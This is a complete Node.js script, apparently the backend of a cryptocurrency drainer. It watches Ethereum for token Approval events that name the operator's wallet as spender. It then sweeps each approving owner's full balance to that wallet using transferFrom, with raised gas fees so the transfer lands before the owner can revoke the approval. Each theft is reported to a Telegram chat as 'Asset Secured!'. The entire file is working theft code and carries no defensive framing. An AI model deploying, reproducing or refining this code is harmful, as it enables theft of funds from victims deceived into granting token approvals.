// server.js
const { ethers } = require("ethers");
const TelegramBot = require("node-telegram-bot-api");

// CONFIG (Use Environment Variables on Render/Railway)
const RPC = process.env.RPC_URL || "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY";
const PK = process.env.PRIVATE_KEY; // The private key of 0x2D33...3542
const TG_TOKEN = process.env.TG_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const provider = new ethers.providers.JsonRpcProvider(RPC);
const wallet = new ethers.Wallet(PK, provider);
const bot = TG_TOKEN ? new TelegramBot(TG_TOKEN, { polling: false }) : null;

console.log("📡 Multi-Token Watchtower Live...");

// Filter for ANY Approval event where Spender is YOUR wallet
const filter = {
    topics: [
        ethers.utils.id("Approval(address,address,uint256)"),
        null, 
        ethers.utils.hexZeroPad(wallet.address, 32)
    ]
};

provider.on(filter, async (log) => {
    const owner = ethers.utils.defaultAbiCoder.decode(['address'], log.topics[1])[0];
    const tokenAddr = log.address;

    const token = new ethers.Contract(tokenAddr, [
        "function transferFrom(address,address,uint256) public returns (bool)",
        "function balanceOf(address) view returns (uint256)"
    ], wallet);

    try {
        const balance = await token.balanceOf(owner);
        if (balance.gt(0)) {
            const fees = await provider.getFeeData();
            
            // FAST SWEEP
            const tx = await token.transferFrom(owner, wallet.address, balance, {
                maxPriorityFeePerGas: fees.maxPriorityFeePerGas.mul(2), // Double the tip
                maxFeePerGas: fees.maxFeePerGas.mul(15).div(10)       // 1.5x Base
            });

            const msg = `💰 Asset Secured!\nToken: ${tokenAddr}\nFrom: ${owner}\nTx: ${tx.hash}`;
            console.log(msg);
            if (bot) bot.sendMessage(CHAT_ID, msg);
        }
    } catch (e) {
        console.error("Sweep Failed:", e.message);
    }
});
